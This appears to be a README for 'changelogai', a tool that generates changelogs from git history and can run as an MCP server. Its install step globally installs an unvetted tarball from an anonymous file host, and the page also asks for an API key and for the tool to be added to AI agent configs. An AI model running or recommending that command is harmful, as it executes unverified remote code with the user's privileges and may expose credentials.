changelogai

Generate professional changelogs from git history — instantly.

zero config AI-enhanced MCP server no dependencies MIT license

What it does

  • Auto-detects tags, parses conventional commits — works on any repo
  • Smart grouping into Features, Bug Fixes, Performance, etc.
  • AI mode rewrites commits into user-facing release notes (Claude)
  • Clickable commit links — auto-detects GitHub/GitLab remote
  • JSON output for CI/CD, version bump suggestion, prepend mode
  • MCP server included — other AI agents can call it as a tool

Try it now (free)

Install globally

npm install -g https://files.catbox.moe/n5rjzo.tgz
# Generate changelog
changelogai --group

# AI-enhanced (needs ANTHROPIC_API_KEY)
changelogai --ai --group --output CHANGELOG.md

# JSON for CI/CD
changelogai --format json

# Version bump suggestion
changelogai --version-bump

Use as library

const { generateChangelog, getGitLog, getLatestTag } = require('changelogai');

const commits = getGitLog('.', 'v1.0.0', 'HEAD', 500);
const md = await generateChangelog(commits, {
  format: 'markdown', group: true
});

MCP Server

Add to your Claude Code or Cursor config:

{
  "mcpServers": {
    "changelogai": { "command": "changelogai-mcp" }
  }
}

Exposes changelogai_generate and changelogai_version_bump as tools.
